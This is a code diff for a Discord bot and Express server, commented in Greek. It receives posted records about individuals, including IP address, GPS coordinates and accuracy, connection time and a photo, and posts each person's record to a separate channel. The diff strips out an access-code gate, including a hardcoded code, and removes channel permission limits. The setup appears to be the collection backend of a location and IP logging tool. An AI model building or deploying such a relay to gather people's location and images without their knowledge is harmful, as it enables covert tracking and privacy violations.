@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType, PermissionsBitField } = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder, ChannelType } = require('discord.js');
 const express = require('express');
 const cors = require('cors');
 
@@ -14,28 +14,20 @@ const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
+        GatewayIntentBits.MessageContent
     ]
 });
 
 const TOKEN = process.env.BOT_TOKEN;
 const SERVER_ID = process.env.SERVER_ID;
 const CATEGORY_ID = '1545817704127266876';
-const WELCOME_CHANNEL_ID = '1545861068117774349';
-const ACCESS_CODE = process.env.ACCESS_CODE || 'loco_mp3!';
-const VERIFIED_ROLE_ID = '1545864778742763601';
 
-const accessUsers = new Set();
 const messageCache = new Map();
 
 // ---------- ΕΚΚΙΝΗΣΗ BOT ----------
 client.once('ready', () => {
     console.log(`✅ Bot online: ${client.user.tag}`);
     console.log(`📁 Κατηγορία ID: ${CATEGORY_ID}`);
-    console.log(`👋 Welcome Channel ID: ${WELCOME_CHANNEL_ID}`);
-    console.log(`🔑 Access Code: ${ACCESS_CODE ? '✅ Ορισμένος' : '❌ Δεν έχει οριστεί'}`);
-    console.log(`🎭 Verified Role ID: ${VERIFIED_ROLE_ID}`);
     
     const guild = client.guilds.cache.get(SERVER_ID);
     if (guild) {
@@ -45,164 +37,8 @@ client.once('ready', () => {
         } else {
             console.error(`❌ Δεν βρέθηκε κατηγορία με ID: ${CATEGORY_ID}`);
         }
-        
-        const welcomeChannel = guild.channels.cache.get(WELCOME_CHANNEL_ID);
-        if (welcomeChannel) {
-            console.log(`✅ Βρέθηκε το welcome κανάλι: #${welcomeChannel.name}`);
-        } else {
-            console.error(`❌ Δεν βρέθηκε welcome κανάλι με ID: ${WELCOME_CHANNEL_ID}`);
-        }
-        
-        const role = guild.roles.cache.get(VERIFIED_ROLE_ID);
-        if (role) {
-            console.log(`✅ Βρέθηκε το role: ${role.name}`);
-        } else {
-            console.error(`❌ Δεν βρέθηκε role με ID: ${VERIFIED_ROLE_ID}`);
-        }
     } else {
         console.error(`❌ Δεν βρέθηκε server με ID: ${SERVER_ID}`);
-    }
-});
-
-// ---------- WELCOME SYSTEM ----------
-client.on('guildMemberAdd', async (member) => {
-    console.log(`👤 Νέο μέλος στον server: ${member.user.tag} (${member.id})`);
-    
-    try {
-        const guild = client.guilds.cache.get(SERVER_ID);
-        if (!guild) {
-            console.error('❌ Δεν βρέθηκε ο server');
-            return;
-        }
-
-        const welcomeChannel = guild.channels.cache.get(WELCOME_CHANNEL_ID);
-        if (!welcomeChannel) {
-            console.error(`❌ Δεν βρέθηκε το welcome κανάλι με ID: ${WELCOME_CHANNEL_ID}`);
-            return;
-        }
-
-        const row = new ActionRowBuilder()
-            .addComponents(
-                new ButtonBuilder()
-                    .setCustomId('access_button')
-                    .setLabel('🔑 Access')
-                    .setStyle(ButtonStyle.Primary)
-            );
-
-        const embed = new EmbedBuilder()
-            .setColor(0x00ff88)
-            .setTitle('👋 ΚΑΛΩΣ ΗΡΘΕΣ!')
-            .setDescription(`Καλώς ήρθες στον server μας, **${member.user.username}**! 🎉`)
-            .addFields(
-                { name: '👤 Χρήστης', value: `${member.user.tag}`, inline: true },
-                { name: '📅 Δημιουργία Λογαριασμού', value: `<t:${Math.floor(member.user.createdTimestamp / 1000)}:R>`, inline: true },
-                { name: '📊 Σειρά Εγγραφής', value: `#${guild.memberCount}`, inline: true },
-                { name: '🔒 Πρόσβαση', value: 'Πάτα το κουμπί **Access** για να δεις τα κανάλια των χρηστών', inline: false }
-            )
-            .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 256 }))
-            .setTimestamp()
-            .setFooter({ 
-                text: 'Secure Connection System • Auto-Welcome',
-                iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
-            });
-
-        await welcomeChannel.send({ 
-            embeds: [embed],
-            components: [row]
-        });
-        console.log(`👋 Στάλθηκε welcome για τον ${member.user.tag} στο #${welcomeChannel.name}`);
-
-    } catch (error) {
-        console.error('❌ Σφάλμα κατά την αποστολή welcome:', error);
-    }
-});
-
-// ---------- INTERACTION HANDLER ----------
-client.on('interactionCreate', async (interaction) => {
-    if (interaction.isButton() && interaction.customId === 'access_button') {
-        console.log(`🔑 Ο ${interaction.user.tag} πάτησε το κουμπί Access`);
-
-        const modal = new ModalBuilder()
-            .setCustomId('access_modal')
-            .setTitle('🔑 Πρόσβαση στα Καναλιά');
-
-        const codeInput = new TextInputBuilder()
-            .setCustomId('access_code_input')
-            .setLabel('Εισάγετε τον κωδικό πρόσβασης')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('••••••••')
-            .setRequired(true)
-            .setMinLength(1)
-            .setMaxLength(50);
-
-        const row = new ActionRowBuilder().addComponents(codeInput);
-        modal.addComponents(row);
-
-        await interaction.showModal(modal);
-    }
-
-    if (interaction.isModalSubmit() && interaction.customId === 'access_modal') {
-        const code = interaction.fields.getTextInputValue('access_code_input');
-        console.log(`🔑 Ο ${interaction.user.tag} υπέβαλε κωδικό`);
-
-        if (code === ACCESS_CODE) {
-            accessUsers.add(interaction.user.id);
-            console.log(`✅ Ο ${interaction.user.tag} πήρε πρόσβαση!`);
-
-            try {
-                const guild = client.guilds.cache.get(SERVER_ID);
-                if (guild) {
-                    const member = await guild.members.fetch(interaction.user.id);
-                    if (member) {
-                        // 1. Δίνουμε το verified role
-                        const role = guild.roles.cache.get(VERIFIED_ROLE_ID);
-                        if (role) {
-                            try {
-                                await member.roles.add(role);
-                                console.log(`✅ Δόθηκε το role ${role.name} στον ${interaction.user.tag}`);
-                            } catch (roleError) {
-                                console.error('❌ Δεν μπόρεσα να δώσω το role:', roleError.message);
-                            }
-                        } else {
-                            console.error(`❌ Δεν βρέθηκε το role με ID: ${VERIFIED_ROLE_ID}`);
-                        }
-
-                        // 2. Δίνουμε permission να βλέπει την κατηγορία
-                        const category = guild.channels.cache.get(CATEGORY_ID);
-                        if (category) {
-                            try {
-                                await category.permissionOverwrites.edit(member, {
-                                    ViewChannel: true,
-                                    ReadMessageHistory: true
-                                });
-                                console.log(`✅ Δόθηκαν permissions στον ${interaction.user.tag} για την κατηγορία`);
-                            } catch (permError) {
-                                console.error('❌ Δεν μπόρεσα να δώσω permissions στην κατηγορία:', permError.message);
-                            }
-                        }
-
-                        // 3. Απάντηση επιτυχίας
-                        await interaction.reply({
-                            content: '✅ **Πρόσβαση παραχωρήθηκε!** Μπορείς τώρα να δεις τα κανάλια των χρηστών. 🔓',
-                            flags: 64 // ephemeral
-                        });
-                    }
-                }
-            } catch (permError) {
-                console.error('❌ Σφάλμα κατά το permission:', permError);
-                await interaction.reply({
-                    content: '⚠️ Σφάλμα κατά την παραχώρηση πρόσβασης. Παρακαλώ ενημέρωσε τον διαχειριστή.',
-                    flags: 64 // ephemeral
-                });
-            }
-
-        } else {
-            await interaction.reply({
-                content: '❌ **Λάθος κωδικός!** Δοκίμασε ξανά. Η πρόσβαση δεν δόθηκε.',
-                flags: 64 // ephemeral
-            });
-            console.log(`❌ Ο ${interaction.user.tag} έβαλε λάθος κωδικό`);
-        }
     }
 });
 
@@ -214,9 +50,10 @@ function cleanName(name) {
         .substring(0, 30);
 }
 
-function createDataEmbed(dataString, userName, photoBase64) {
+function parseDataToEmbed(dataString, userName, photoBase64) {
+    // Δημιουργία embed
     const embed = new EmbedBuilder()
-        .setColor(0x5865F2)
+        .setColor(0x5865F2) // Discord blue
         .setTitle('🔒 ΑΝΑΦΟΡΑ ΑΣΦΑΛΕΙΑΣ')
         .setDescription(`**Χρήστης:** ${userName || 'Άγνωστος'}`)
         .setTimestamp()
@@ -226,14 +63,17 @@ function createDataEmbed(dataString, userName, photoBase64) {
         })
         .setThumbnail('https://cdn.discordapp.com/emojis/1085933512993218630.png');
 
+    // Αν υπάρχει φωτογραφία
     if (photoBase64 && photoBase64.startsWith('data:image/')) {
         embed.setImage('attachment://photo.jpg');
     }
 
+    // Καθαρισμός και διαχωρισμός γραμμών
     const lines = dataString.split('\n')
         .map(line => line.trim())
         .filter(line => line.length > 0);
 
+    // Ορισμός των πεδίων με τα emojis τους
     const fieldMap = {
         '👤': { name: '👤 Στοιχεία Χρήστη', icon: '👤' },
         '🌐': { name: '🌐 Διεύθυνση IP', icon: '🌐' },
@@ -250,8 +90,7 @@ function createDataEmbed(dataString, userName, photoBase64) {
         '⏱️': { name: '⏱️ Χρόνος Σύνδεσης', icon: '⏱️' },
         '📍': { name: '📍 Συντεταγμένες GPS', icon: '📍' },
         '🎯': { name: '🎯 Ακρίβεια GPS', icon: '🎯' },
-        '📊': { name: '📊 Στατιστικά', icon: '📊' },
-        '🔒': { name: '🔒 VPN Detection', icon: '🔒' }
+        '📊': { name: '📊 Στατιστικά', icon: '📊' }
     };
 
     let currentField = null;
@@ -260,6 +99,7 @@ function createDataEmbed(dataString, userName, photoBase64) {
     let generalInfo = [];
 
     for (const line of lines) {
+        // Έλεγχος αν η γραμμή ξεκινά με emoji πεδίου
         let matchedEmoji = null;
         for (const emoji of Object.keys(fieldMap)) {
             if (line.startsWith(emoji)) {
@@ -269,6 +109,7 @@ function createDataEmbed(dataString, userName, photoBase64) {
         }
 
         if (matchedEmoji) {
+            // Αποθήκευση προηγούμενου πεδίου
             if (currentField && currentValue) {
                 fields.push({
                     name: currentField,
@@ -277,9 +118,11 @@ function createDataEmbed(dataString, userName, photoBase64) {
                 });
             }
             
+            // Δημιουργία νέου πεδίου
             const parts = line.split(':').map(s => s.trim());
             if (parts.length >= 2) {
                 const value = parts.slice(1).join(':').trim();
+                // Αφαίρεση ** από την τιμή
                 const cleanValue = value.replace(/\*\*/g, '');
                 currentField = fieldMap[matchedEmoji].name;
                 currentValue = cleanValue;
@@ -288,14 +131,17 @@ function createDataEmbed(dataString, userName, photoBase64) {
                 currentValue = line.replace(/\*\*/g, '');
             }
         } else {
+            // Συνέχιση τρέχοντος πεδίου
             if (currentField) {
                 currentValue += '\n' + line.replace(/\*\*/g, '');
             } else {
+                // Γενικές πληροφορίες
                 generalInfo.push(line.replace(/\*\*/g, ''));
             }
         }
     }
 
+    // Αποθήκευση τελευταίου πεδίου
     if (currentField && currentValue) {
         fields.push({
             name: currentField,
@@ -304,6 +150,7 @@ function createDataEmbed(dataString, userName, photoBase64) {
         });
     }
 
+    // Αν υπάρχουν γενικές πληροφορίες, τις προσθέτουμε
     if (generalInfo.length > 0) {
         embed.addFields({
             name: '📋 Γενικές Πληροφορίες',
@@ -312,6 +159,7 @@ function createDataEmbed(dataString, userName, photoBase64) {
         });
     }
 
+    // Προσθήκη πεδίων στο embed
     for (const field of fields) {
         let value = field.value;
         if (value.length > 1024) {
@@ -324,6 +172,7 @@ function createDataEmbed(dataString, userName, photoBase64) {
         });
     }
 
+    // Αν δεν υπάρχουν καθόλου πεδία, βάζουμε όλα σε description
     if (fields.length === 0 && generalInfo.length === 0) {
         embed.setDescription('```' + dataString.replace(/\*\*/g, '') + '```');
     }
@@ -369,12 +218,7 @@ app.post('/', async (req, res) => {
             return res.status(500).json({ success: false, error: 'Category not found' });
         }
         
-        const verifiedRole = guild.roles.cache.get(VERIFIED_ROLE_ID);
-        if (!verifiedRole) {
-            console.error(`❌ Δεν βρέθηκε το role με ID: ${VERIFIED_ROLE_ID}`);
-            return res.status(500).json({ success: false, error: 'Verified role not found' });
-        }
-        
+        // Δημιουργία ονόματος καναλιού
         const channelName = `👤-${cleanName(name)}`;
         console.log(`📝 Αναζήτηση/δημιουργία καναλιού: ${channelName}`);
         
@@ -390,36 +234,14 @@ app.post('/', async (req, res) => {
                 name: channelName,
                 type: ChannelType.GuildText,
                 parent: CATEGORY_ID,
-                reason: `Κανάλι για τον χρήστη ${name}`,
-                permissionOverwrites: [
-                    {
-                        id: guild.id,
-                        deny: [
-                            PermissionsBitField.Flags.ViewChannel,
-                            PermissionsBitField.Flags.ReadMessageHistory
-                        ]
-                    },
-                    {
-                        id: verifiedRole.id,
-                        allow: [
-                            PermissionsBitField.Flags.ViewChannel,
-                            PermissionsBitField.Flags.ReadMessageHistory
-                        ],
-                        deny: [
-                            PermissionsBitField.Flags.SendMessages,
-                            PermissionsBitField.Flags.CreateInstantInvite,
-                            PermissionsBitField.Flags.AddReactions,
-                            PermissionsBitField.Flags.ManageMessages,
-                            PermissionsBitField.Flags.ManageThreads
-                        ]
-                    }
-                ]
+                reason: `Κανάλι για τον χρήστη ${name}`
             });
             console.log(`✅ Δημιουργήθηκε το κανάλι: ${channel.name}`);
         } else {
             console.log(`✅ Βρέθηκε υπάρχον κανάλι: ${channel.name}`);
         }
         
+        // Έλεγχος αν τα δεδομένα είναι ίδια
         const dataHash = Buffer.from(data + (photo || '')).toString('base64').substring(0, 50);
         const cacheKey = `${channel.id}_${name}`;
         
@@ -432,10 +254,13 @@ app.post('/', async (req, res) => {
             });
         }
         
+        // Διαγραφή παλιών μηνυμάτων
         await clearChannelMessages(channel);
         
-        const embed = createDataEmbed(data, name, photo);
+        // Δημιουργία embed
+        const embed = parseDataToEmbed(data, name, photo);
         
+        // Προετοιμασία αποστολής
         let messageOptions = { embeds: [embed] };
         
         if (photo && photo.startsWith('data:image/')) {
@@ -447,9 +272,11 @@ app.post('/', async (req, res) => {
             }];
         }
         
+        // Αποστολή
         await channel.send(messageOptions);
         console.log(`📤 ΕΠΙΤΥΧΙΑ! Στάλθηκε στο #${channel.name}`);
         
+        // Αποθήκευση hash
         messageCache.set(cacheKey, dataHash);
         
         res.json({ 
@@ -467,15 +294,13 @@ app.post('/', async (req, res) => {
     }
 });
 
+// Health check
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
         bot: client.user?.tag || 'not ready',
         server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
-        category: CATEGORY_ID,
-        welcomeChannel: WELCOME_CHANNEL_ID,
-        verifiedRole: VERIFIED_ROLE_ID,
-        accessUsers: accessUsers.size
+        category: CATEGORY_ID
     });
 });
 
@@ -484,9 +309,7 @@ app.get('/test', (req, res) => {
         message: '✅ Το bot λειτουργεί!',
         bot: client.user?.tag || 'not ready',
         server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
-        category: CATEGORY_ID,
-        welcomeChannel: WELCOME_CHANNEL_ID,
-        verifiedRole: VERIFIED_ROLE_ID
+        category: CATEGORY_ID
     });
 });
 
